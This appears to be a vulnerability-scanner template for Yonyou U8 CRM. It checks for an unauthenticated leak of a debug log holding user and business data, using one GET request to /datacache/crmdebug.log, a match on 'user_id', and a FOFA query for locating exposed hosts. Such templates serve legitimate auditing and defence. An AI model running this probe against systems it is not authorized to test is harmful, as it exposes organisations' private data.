id: yonyou-crm-log-info-leak-2

info:
  name: "用友 CRM 系统日志信息泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: title:"用友U8CRM"
      用友CRM系统存在日志信息泄露漏洞，攻击者可通过未授权访问获取系统日志文件，导致敏感业务数据、用户操作记录及系统配置信息暴露。该漏洞可能造成企业核心数据资产泄露风险，建议通过日志访问控制策略进行防护。
  tags: 用友 CRM

http:
- raw:
  - |
    GET /datacache/crmdebug.log HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'user_id'
